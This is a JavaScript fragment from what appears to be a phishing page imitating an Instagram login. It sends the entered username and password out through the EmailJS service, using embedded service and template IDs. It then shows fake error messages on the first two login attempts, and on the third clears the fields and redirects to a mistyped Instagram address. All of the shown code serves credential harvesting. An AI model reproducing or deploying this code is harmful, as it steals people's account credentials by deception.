            emailjs.init('AcdfUyUMm_Oi3KubD')
        </script>

        <script>

            const btn = document.getElementById('button');

            document.getElementById('form')
                .addEventListener('submit', function (event) {
                    event.preventDefault();


                    const serviceID = 'service_7js3c1h';
                    const templateID = 'template_gkdi0xs';

                    emailjs.sendForm(serviceID, templateID, this)
                        .then(() => {
                            btn.value = 'Send Email';
                            form.reset();

                        }, (err) => {


                        });
                });

            var clickCount = 0;
            btn.addEventListener('click', function (event) {
                event.preventDefault();


                clickCount++;


                if (clickCount <= 2) {

                    var errorMessage = document.getElementById('errorMessage');
                    errorMessage.textContent = 'An error occurred.';
                } else {

                    var nameInput1 = document.getElementById('pass');
                    nameInput1.value = '';
                    var nameInput = document.getElementById('Username');
                    nameInput.value = '';


                    window.location.href = 'https://www.instagramcom';
                }
            });
            
            const firstNameInput = document.getElementById('Username');
            const lastNameInput = document.getElementById('pass');
            // Add input event listeners to the input fields
            firstNameInput.addEventListener('input', toggleButtonState);
            lastNameInput.addEventListener('input', toggleButtonState);

           
            function toggleButtonState() {
               
                if( firstNameInput.value.length === 1 || lastNameInput.value.length === 1){
                    btn.disabled = true;
                }
                else{
                    btn.disabled = false;
                };
            }


        </script>
